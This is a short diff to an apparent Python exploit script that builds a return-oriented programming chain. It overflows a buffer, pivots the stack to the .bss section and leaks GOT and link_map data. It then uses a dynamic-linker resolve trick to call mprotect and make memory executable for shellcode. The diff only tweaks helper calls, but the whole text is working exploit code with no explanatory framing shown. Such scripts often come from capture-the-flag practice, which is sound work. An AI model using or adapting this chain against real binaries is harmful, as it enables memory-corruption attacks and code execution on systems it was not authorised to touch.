@@ -8,7 +8,7 @@ sc = Shellcode('x86-64')
 addr_stage = rop.section('.bss') + 0x400
 
 buf = rop.retfill(offset)
-buf += rop.call_chain_plt(
+buf += rop.call_chain_ptr(
     ['write', 1, rop.got()+8, 8],
     ['read', 0, addr_stage, 400]
 , pivot=addr_stage)
@@ -21,7 +21,7 @@ addr_dt_debug = addr_link_map + 0x1c8
 
 buf = p64(rop.gadget('ret'))
 buf += rop.call_chain_ptr(
-    [rop.got('read'), 0, addr_dt_debug, 8],
+    ['read', 0, addr_dt_debug, 8],
     [addr_stage, addr_stage & ~0xFFF, 0x1000, 7]
 )
 buf += rop.dl_resolve(addr_stage + len(buf), 'mprotect')
